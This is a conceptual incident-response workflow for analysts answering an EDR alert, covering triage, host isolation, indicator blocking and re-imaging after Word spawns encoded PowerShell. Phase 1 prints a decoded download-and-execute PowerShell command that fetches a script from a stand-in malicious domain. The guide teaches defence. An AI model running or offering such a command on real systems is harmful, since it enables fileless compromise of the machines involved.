# Conceptual Workflow: EDR Alert Response

This document outlines a conceptual workflow for an analyst responding to a high-priority alert from an Endpoint Detection and Response (EDR) tool.

### Scenario: EDR alerts on "Malicious PowerShell Execution" on workstation `WS-FINANCE-05`.

---

### Phase 1: Triage & Initial Investigation (What happened?)

**1. Review the Alert:**
   - **What process executed?** `powershell.exe`
   - **Who was the parent process?** `winword.exe` (Microsoft Word). *This is highly suspicious.* A user opening a Word doc should not be spawning PowerShell.
   - **What was the command line?** `powershell.exe -enc JABjAGwA...` (A long Base64 string).
   - **Who was the user?** `j.doe`

**2. Decode the Command:**
   - Copy the Base64 string from the command line.
   - Use a tool (like CyberChef or `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('...'))` in PowerShell) to decode it.
   - **Decoded Command:** `IEX (New-Object Net.WebClient).DownloadString('http://evil-domain.com/payload.ps1')`
   - **Analysis:** The command downloads and executes a script from a remote, suspicious domain. This is an "in-memory" or "fileless" attack vector.

**3. Check Endpoint Vitals (in EDR console):**
   - **Network Connections:** Does the host `WS-FINANCE-05` have an active connection to `evil-domain.com`?
   - **Recent File Modifications:** Were any files written to disk around the time of the alert? (e.g., in `C:\Users\j.doe\AppData\Local\Temp\`)
   - **Persistence Mechanisms:** Did the script create any new Scheduled Tasks, Registry Run Keys, or Services? (The EDR should flag this).

Initial Verdict:** **True Positive.** This is an active compromise originating from a likely malicious document.

---

### Phase 2: Response & Containment (How do I stop it?)

**1. Isolate the Host (Immediate Action):**
   - Use the EDR console to execute the "Isolate Host" or "Network Containment" function.
   - This uses the EDR agent to block all network traffic on the host *except* for the connection back to the EDR console itself.
   - **Goal:** Prevent lateral movement and C2 communication.

**2. Investigate the Payload:**
   - The analyst can now safely investigate the host via the EDR's "Live Response" or "Real-time Terminal" feature.
   - Try to retrieve the `payload.ps1` script for further analysis if possible.
   - Use memory analysis tools (if available via EDR) to dump the memory of suspicious processes to look for injected code.

**3. Block Indicators:**
   - Add the domain `evil-domain.com` and its resolved IP address to the blocklist in the web proxy and firewall.
   - Calculate the hash of the original Word document (if it can be found) and add it to the blocklist.

---

### Phase 3: Eradication & Recovery (How do I fix it?)

**1. Understand the Scope:**
   - Did the attacker move laterally *before* the host was isolated? Check EDR logs on neighboring machines for similar activity.
   - Did the user `j.doe` log into other systems? Their credentials may be compromised.

**2. Remediate:**
   - **User Account:** Disable the `j.doe` user account and force a password reset.
   - **Endpoint:** The safest course of action for a compromised endpoint is to wipe and re-image it from a known-good source.
   - **Email:** Find the original email with the malicious Word document and delete it from the mail server to prevent others from opening it.

**3. De-isolate:**
   - Once the machine is rebuilt and clean, it can be brought back onto the network.
   - Monitor it closely.
